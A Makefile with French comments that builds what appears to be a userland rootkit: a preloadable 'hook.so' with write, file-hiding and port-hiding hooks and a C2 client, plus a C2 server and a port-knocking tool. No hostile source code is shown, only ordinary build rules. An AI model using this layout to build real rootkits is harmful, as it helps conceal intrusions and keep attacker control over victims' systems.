CC = gcc
CFLAGS = -Wall -fPIC -shared -ldl

# Fichiers sources et objets principaux
SRCS = src/hook_write.c src/c2_client.c src/utils.c src/hook_hide_files.c src/hook_hide_ports.c
OBJS = $(SRCS:.c=.o)
TARGET = hook.so

# Serveur C2
C2_SRCS = src/c2_server.c
C2_OBJS = $(C2_SRCS:.c=.o)
C2_TARGET = c2_server

# Port Knocking
PORT_KNOCK_SRCS = src/port_knocking.c
PORT_KNOCK_OBJS = $(PORT_KNOCK_SRCS:.c=.o)
PORT_KNOCK_TARGET = port_knocking

# Règles principales
all: $(TARGET) $(C2_TARGET) $(PORT_KNOCK_TARGET)

$(TARGET): $(OBJS)
	$(CC) $(CFLAGS) -o $(TARGET) $(OBJS)

$(C2_TARGET): $(C2_OBJS)
	$(CC) -o $(C2_TARGET) $(C2_OBJS) -lpthread

$(PORT_KNOCK_TARGET): $(PORT_KNOCK_OBJS)
	$(CC) -o $(PORT_KNOCK_TARGET) $(PORT_KNOCK_OBJS) -lpthread

%.o: %.c
	$(CC) -c -I./include $(CFLAGS) -o $@ $<

clean:
	rm -f $(OBJS) $(TARGET) $(C2_OBJS) $(PORT_KNOCK_OBJS) $(C2_TARGET) $(PORT_KNOCK_TARGET)
